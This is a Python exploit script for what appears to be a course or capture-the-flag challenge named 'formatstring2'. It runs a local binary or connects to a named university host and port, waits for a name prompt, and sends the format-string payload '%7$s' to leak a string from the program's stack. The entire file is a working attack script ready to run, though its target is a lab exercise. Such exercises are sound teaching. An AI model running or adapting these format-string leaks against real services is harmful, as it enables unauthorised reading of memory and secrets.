#!/usr/bin/env python3
"""
formatstring2 helper.

Default use:
    python exploit.py

Local mode:
    python exploit.py --mode local
"""

from __future__ import annotations

import argparse
import socket
import subprocess


BINARY = "./hidden_string"
HOST = "moa6.eecs.utk.edu"
PORT = 32110
PAYLOAD = b"%7$s\n"


def recv_until(sock: socket.socket, marker: bytes, timeout: float = 5.0) -> bytes:
    """Read data until marker appears."""
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def run_local() -> None:
    proc = subprocess.Popen(
        [BINARY],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=0,
    )

    if proc.stdin is None or proc.stdout is None:
        raise RuntimeError("Failed to open subprocess pipes")

    seen = ""
    target = "What's your name?"
    while target not in seen:
        ch = proc.stdout.read(1)
        if ch == "":
            break
        seen += ch

    print(seen, end="")

    proc.stdin.write(PAYLOAD.decode())
    proc.stdin.flush()

    rest = proc.stdout.read()
    if rest:
        print(rest, end="")

    proc.wait(timeout=3)


def run_remote() -> None:
    with socket.create_connection((HOST, PORT), timeout=5.0) as sock:
        pre = recv_until(sock, b"What's your name?")
        print(pre.decode(errors="replace"), end="")

        sock.sendall(PAYLOAD)

        sock.settimeout(2.0)
        out = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                out += chunk
        except socket.timeout:
            pass

        print(out.decode(errors="replace"), end="")


def main() -> None:
    parser = argparse.ArgumentParser(description="formatstring2 helper")
    parser.add_argument(
        "--mode",
        choices=["local", "remote"],
        default="remote",
        help="target mode (default: remote)",
    )
    args = parser.parse_args()

    if args.mode == "local":
        run_local()
    else:
        run_remote()


if __name__ == "__main__":
    main()
